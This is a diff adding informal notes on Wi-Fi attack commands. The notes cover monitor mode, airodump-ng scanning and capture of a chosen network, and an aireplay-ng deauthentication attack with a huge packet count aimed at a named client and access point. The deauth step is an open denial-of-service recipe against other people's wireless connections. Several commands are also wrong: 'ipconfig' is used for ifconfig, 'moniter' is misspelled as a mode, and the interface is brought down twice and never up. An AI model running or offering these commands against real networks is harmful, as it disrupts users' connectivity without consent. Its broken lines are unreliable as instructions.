@@ -1,0 +1,28 @@
+how to set to moniter mode =>
+
+    ipconfig wlx1cbfce04e4dd down
+    iwconfig wlx1cbfce04e4dd mode moniter
+    ipconfig wlx1cbfce04e4dd down
+
+
+how to see surrounding networks =>
+    
+    airodump-ng
+    airodump-ng --band a wlx1cbfce04e4dd    #for 5ghz network
+    airodump-ng --band abg wlx1cbfce04e4dd
+    airodump-ng --band bg wlx1cbfce04e4dd
+
+to see a specific network and who is connected to that =>
+    
+    airodump-ng --bssid DC:1A:C5:7C:CB:71 --channel 1 wlx1cbfce04e4dd
+    airodump-ng --bssid DC:1A:C5:7C:CB:71 --channel 1 wlx1cbfce04e4dd --write text
+                                                                        ^ this for write output in a file
+
+        all data packets is stored in *.cap file which can be seen by using a tool called wireshark
+        *all data will be encrypted if network is encrypted*
+
+to deauthenticate any device from the target =>
+
+    choose the mac of target device and run the following command =>    
+    aireplay-ng --deauth 10000000000 -a DC:1A:C5:7C:CB:71 -c D8:32:E3:00:98:11 wlx1cbfce04e4dd
+    
